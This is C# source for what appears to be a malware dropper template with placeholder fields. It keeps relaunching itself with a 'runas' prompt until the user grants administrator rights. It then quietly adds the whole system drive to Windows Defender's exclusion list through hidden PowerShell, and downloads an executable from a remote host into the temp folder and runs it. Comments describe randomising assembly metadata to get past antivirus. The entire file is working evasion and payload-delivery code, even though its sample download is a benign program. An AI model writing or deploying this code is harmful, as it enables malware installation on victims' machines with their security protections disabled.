using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Security.Principal;
using System.IO;
using System.Threading;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Net;


// Generate random assembly info since this triggers some AVs

[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESCRIPTION%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyFileVersion("1.0.0.1")]
[assembly: AssemblyVersion("1.0.0.1")]
[assembly: Guid("%GUID%")]
[assembly: ComVisible(false)]

namespace SomeNamespace
{
    public class Program
    {
        static void Main()
        {
            // Uses ForceUAC technique to make the user run the payload as administrator
            //
            // Check if current exectuable has admin priviliges, if not then enter the loop
            while (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                // Create process to start cmd and prompt user for admin rights
                ProcessStartInfo info = new ProcessStartInfo();
                info.FileName = "cmd.exe";
                info.UseShellExecute = true;
                info.Verb = "runas";
                info.Arguments = "/k START \"\" \"" + System.Reflection.Assembly.GetEntryAssembly().Location + "\" & EXIT";

                try
                {
                    Process.Start(info);
                    Environment.Exit(0);
                }
                catch (Exception) { }
            }


            // Now since we have admin priviliges we use windows defenders exclusion system to add our file to the exclusion list
            // In this case we just add the whole drive to the exclusion list incase we want to drop other files
            Process scdown = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Add-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            scdown.Start();
            scdown.WaitForExit();

            MessageBox.Show("Windows Defender has been bypassed!");

            // Download file remotely drop in temp path and execute it
            string path = Path.Combine(Path.GetTempPath(), "%RNDPATH%.exe");


            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            using (WebClient wc = new WebClient())
            {
                // in this example we just download putty a simple ssh software
                wc.DownloadFile("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", path);
                wc.Dispose();
            }

            try
            {
                Process.Start(path);
            }
            catch { }

        }
    }
}